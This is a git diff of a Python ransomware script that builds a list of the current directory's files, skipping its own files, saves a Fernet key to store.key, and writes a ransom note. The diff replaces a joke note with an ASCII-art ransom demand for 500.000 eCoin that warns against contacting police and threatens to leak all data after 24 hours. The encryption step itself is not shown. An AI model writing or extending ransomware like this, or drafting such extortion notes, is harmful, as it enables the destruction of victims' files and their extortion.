@@ -12,7 +12,7 @@ key = Fernet.generate_key()
 
 
 for file in os.listdir():
-    if file == "monsterwith23faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "after_ransom_is_given_run_this.sh":
+    if file == "monsterwith23faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "after_ransom_is_given_run_this.sh" or file == "run_this.sh":
         continue
     if os.path.isfile(file):
         files.append(file)
@@ -20,7 +20,41 @@ for file in os.listdir():
 with open("store.key", "wb") as thekey:
     thekey.write(key)
 
-note = "Give me many bonanas."
+note = """
+                                                                          ._                                            ,
+                                                                            (`)..                                    ,.-')
+                                                                            (',.)-..                            ,.-(..`)         
+                                                                              (,.' ,.)-..                    ,.-(. `.. )                    
+                                                                              (,.' ..' .)-..            ,.-( `.. `.. )                     
+                                                                                (,.' ,.'  ..')-.     ,.-( `. `.. `.. )                      
+                                                                                (,.'  ,.' ,.'  )-.-('   `. `.. `.. )                       
+                                                                                  ( ,.' ,.'    _== ==_     `.. `.. )                        
+                                                                                  ( ,.'   _==' ~  ~  `==_    `.. )                     
+                                                                                    \  _=='   ----..----  `==_   )                     
+                                                                                ,.-:    ,----___.  .___----.    -..                        
+                                                                            ,.-'   (   _--====_  \/  _====--_   )  `-..                 
+                                                                        ,.-'   .__.'`.  `-_I0_-'    `-_0I_-'  .'`.__.  `-..     
+                                                                    ,.-'.'   .'      (          |  |          )      `.   `.-..  
+                                                                ,.-'    :    `___--- '`.__.    / __ \    .__.' `---___'    :   `-..      
+                                                              -'_________`-____________'__ \  (O)  (O)  / __`____________-'________`-     
+                                                                                          \ . _  __  _ . /                               
+                                                                                            \ `V-'  `-V' |                                 
+                                                                                            | \ \ | /  /                                 
+                                                                                              V \ ~| ~/V                                   
+                                                                                              |  \  /|                                    
+                                                                                                \~ | V                                 
+                                                                                                \  |                                        
+                                                                                                  VV
+
+                                                                                  Wire 500.000 eCoin to the following account:
+                                                                                              nikolaistokkebro.online
+                                                                                                    
+                                                                                           No police. No Feds. Just you.
+
+                                                              if the requirements are not met before 24 hours have passed, all your data will be leaked.
+                                                                                                     Be smart.
+                                                                           
+                                                                                                  """
 
 with open("ransom_note.txt", "w") as ransom_note:
     ransom_note.write(note)
